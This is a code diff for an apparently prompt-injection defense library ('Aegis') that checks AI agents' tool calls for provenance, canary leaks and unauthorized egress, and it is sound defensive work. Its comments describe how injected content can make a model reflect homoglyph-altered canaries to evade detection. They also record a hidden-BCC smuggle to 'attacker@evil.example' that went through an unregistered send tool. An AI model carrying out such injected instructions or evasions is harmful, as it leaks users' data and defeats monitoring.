@@ -3,6 +3,7 @@ import { AegisAttributionError } from './types.js';
 import { candidateRepresentations, candidateContentRepresentations, normalizeMatchText } from './normalize.js';
 import { egressAuthorizationCheck } from './egress.js';
 import { resolveCanonicalTool } from './tool-contracts.js';
+import { collectLeafStrings, hasCircularReference } from './traversal.js';
 
 export interface ProvenanceMatchResult {
   inertOnly: boolean;
@@ -71,52 +72,14 @@ function normalizeText(value: string): string {
   return value.replace(/\s+/g, ' ').trim().toLowerCase();
 }
 
-// Detects true cycles (an object appearing among its own ancestors), not
-// merely a value referenced twice — a DAG with shared sub-objects is valid
-// JSON and must not be rejected. `ancestors` tracks only the current
-// recursion path and is unwound on the way back up, so revisiting a shared
-// reference from a sibling branch is not flagged.
-function hasCircularReference(value: unknown, ancestors: Set<object> = new Set()): boolean {
-  if (value === null || typeof value !== 'object') {
-    return false;
-  }
-  if (ancestors.has(value)) {
-    return true;
-  }
-
-  ancestors.add(value);
-  const children = Array.isArray(value) ? value : Object.values(value as Record<string, unknown>);
-  const circular = children.some((child) => hasCircularReference(child, ancestors));
-  ancestors.delete(value);
-  return circular;
-}
-
-function extractStrings(value: unknown): string[] {
-  if (value === null || value === undefined) {
-    return [];
-  }
-
-  if (typeof value === 'string') {
-    return [value];
-  }
-
-  if (typeof value === 'number' || typeof value === 'boolean') {
-    return [String(value)];
-  }
-
-  if (Array.isArray(value)) {
-    return value.flatMap((item) => extractStrings(item));
-  }
-
-  if (typeof value === 'object') {
-    return Object.values(value).flatMap((item) => extractStrings(item));
-  }
-
-  return [];
-}
+// Circular-reference detection and leaf-string extraction now live in
+// src/traversal.ts, shared with egress.ts (#41) — see that module's header
+// for why the two traversals had drifted (JSON-in-string parsing and a depth
+// budget existed only on the egress side) and why this needed to be a single
+// implementation.
 
 export function argumentProvenanceMatch(args: unknown, spans: Span[]): ProvenanceMatchResult {
-  const argValues = extractStrings(args).map((value) => normalizeMatchText(value)).filter(Boolean);
+  const argValues = collectLeafStrings(args).map((value) => normalizeMatchText(value)).filter(Boolean);
   // A model that decodes an obfuscated span (base64/hex/rot13) or folds
   // homoglyphs when repeating it produces plaintext that no longer appears
   // byte-for-byte in the span. Matching against every plausible decoded/
@@ -169,12 +132,23 @@ export function argumentProvenanceMatch(args: unknown, spans: Span[]): Provenanc
   };
 }
 
+// #40: this used to normalize with the weak local `normalizeText` (whitespace
+// collapse + lowercase only), while the provenance-matching pipeline used the
+// stronger `normalizeMatchText` (invisible-character stripping + NFKC/
+// homoglyph folding). Since the canary value is rendered directly into the
+// untrusted span's own framing (`Canary: ${canary}` in assembly.ts), a model
+// that has been instructed by injected content to reproduce "internal
+// markers" with e.g. a zero-width space spliced in, or a Cyrillic look-alike
+// substituted for a Latin letter, could reflect an altered canary that the
+// weak normalizer would never match against the clean stored value —
+// silently defeating hidden-instruction-use detection. Both sides of the
+// comparison now go through the same canonical security normalizer.
 export function canaryDetection(output: string, canaryMap: Record<string, string>): CanaryDetectionResult {
   const triggeredSpanIds: string[] = [];
-  const payload = normalizeText(output);
+  const payload = normalizeMatchText(output);
 
   for (const [spanId, canary] of Object.entries(canaryMap)) {
-    if (payload.includes(normalizeText(canary))) {
+    if (payload.includes(normalizeMatchText(canary))) {
       triggeredSpanIds.push(spanId);
     }
   }
@@ -222,7 +196,7 @@ export function userSessionIntentMatch(actionName: string, args: unknown, spans:
     return true;
   }
 
-  const argValues = extractStrings(args)
+  const argValues = collectLeafStrings(args)
     .map((value) => normalizeText(value))
     .filter((value) => value.length >= 3);
   if (argValues.some((value) => userText.includes(value))) {
@@ -307,7 +281,7 @@ export interface ContentSensitivityResult {
 export function contentSensitivityCheck(args: unknown): ContentSensitivityResult {
   const reasons = new Set<string>();
 
-  for (const value of extractStrings(args)) {
+  for (const value of collectLeafStrings(args)) {
     for (const rep of candidateContentRepresentations(value)) {
       if (SECRET_KEY_NAME_PATTERN.test(rep)) {
         reasons.add('argument references an environment-variable-shaped secret name');
@@ -475,7 +449,34 @@ export function decideAttribution(
   }
 
   const provenanceMatch = argumentProvenanceMatch(args, spans);
-  const argsCanary = canaryDetection(JSON.stringify(args ?? null), canaryMap);
+  // hasCircularReference's cycle check is depth-guarded (TRAVERSAL_MAX_DEPTH,
+  // traversal.ts) for the same DoS reason collectLeafStrings is: a real cycle
+  // is always caught within a handful of steps (bounded by the number of
+  // distinct objects in the cycle), which is what makes capping depth safe
+  // for THAT check. But a pathological "long acyclic chain that only THEN
+  // closes into a cycle" — the back-edge sitting deeper than the depth
+  // budget — is missed by the capped walk, while Node's native
+  // JSON.stringify still detects it (it isn't depth-limited) and throws a
+  // TypeError, not a RangeError. A prior version of this fix only caught
+  // RangeError here, which still let that TypeError escape uncaught —
+  // caught by Copilot review on PR #51. Catching broadly at this single,
+  // narrow call site (rather than guessing at error subtypes) converts any
+  // serialization failure into the same typed, fail-closed error the
+  // circular-reference guard above already uses.
+  // The catch is intentionally broad (any JSON.stringify failure, not just
+  // the deep-nesting/out-of-budget-cycle cases above): a BigInt value, a
+  // throwing `toJSON`, or any other non-serializable shape in tool_args
+  // fails the same way and deserves the same fail-closed treatment. The
+  // underlying engine message is included for diagnosis.
+  let argsSerialized: string;
+  try {
+    argsSerialized = JSON.stringify(args ?? null);
+  } catch (cause) {
+    throw new AegisAttributionError(
+      `Model returned tool_args that could not be serialized for canary detection: ${cause instanceof Error ? cause.message : String(cause)}`
+    );
+  }
+  const argsCanary = canaryDetection(argsSerialized, canaryMap);
   const textCanary = canaryDetection(modelText ?? '', canaryMap);
   const canary: CanaryDetectionResult = {
     triggered: argsCanary.triggered || textCanary.triggered,
@@ -507,6 +508,49 @@ export function decideAttribution(
     const contentNote = policy.contentSensitivity.sensitive
       ? ` (${policy.contentSensitivity.reasons.join('; ')})`
       : '';
+
+    // Unified sensitive-tool / egress-contract classification (#39): a
+    // sensitive action must either resolve to a tool tool-contracts.ts
+    // actually knows (so egress destination authorization below is a real
+    // check, even when this particular call carries no destination) or be
+    // rejected HERE, explicitly and fail-closed. Without this, a tool name
+    // that satisfies the sensitivity table's name-pattern rules (e.g.
+    // `/^send_/`) but isn't one of the exact aliases in tool-contracts.ts's
+    // TOOL_ALIASES resolves to `egressContract === 'none'`, which
+    // `egressAuthorizationCheck` cannot distinguish from "a recognized
+    // non-egress tool" — it returns 'not-applicable' either way, silently
+    // downgrading to the generic substring-only provenance/user-session
+    // gates below. Those gates evaluate `hasUserSessionIntent` once for the
+    // WHOLE call, so an authorized recipient anywhere in the arguments (e.g.
+    // `to: "alice@corp.example"`, present verbatim in the user's own
+    // message) satisfies intent for the ENTIRE call, including a sibling
+    // `bcc` field the user never authorized — reopening exactly the
+    // authorized-recipient-plus-hidden-BCC smuggle the structural egress
+    // check exists to close. (Confirmed exploitable pre-fix: calling an
+    // unregistered alias like `send_widgets` with
+    // `{ to: "alice@corp.example", bcc: "attacker@evil.example" }` was
+    // silently ALLOWED.)
+    //
+    // Canonical tools that are deliberately non-egress (`delete_file`,
+    // `transfer_funds`, `set_permission`, `search`, `read_file`) are NOT
+    // affected: they resolve here (tool-contracts.ts documents them, just
+    // with an egress contract of `'none'` by design), so only a name Aegis
+    // has genuinely never heard of — sensitive by the caller's own
+    // sensitivity table, unclassified by the tool registry — takes this
+    // path. Extending TOOL_ALIASES with more names does not remove this
+    // check; it is the fail-closed backstop for whatever isn't registered.
+    if (resolveCanonicalTool(actionName) === null) {
+      return {
+        verdict: 'block',
+        reason:
+          `Blocked because '${actionName}' is a sensitive action with no known destination/security contract in ` +
+          `tool-contracts.ts${contentNote}. An unclassified sensitive tool can never be positively authorized on ` +
+          `egress grounds; register it with an explicit contract before enabling it.`,
+        attribution: provenanceMatch,
+        canary,
+        sensitiveAction: policy.sensitiveAction
+      };
+    }
 
     // Structural destination authorization (#27/#28/#29): every egress
     // destination the call carries — at any depth, inside JSON-in-string,
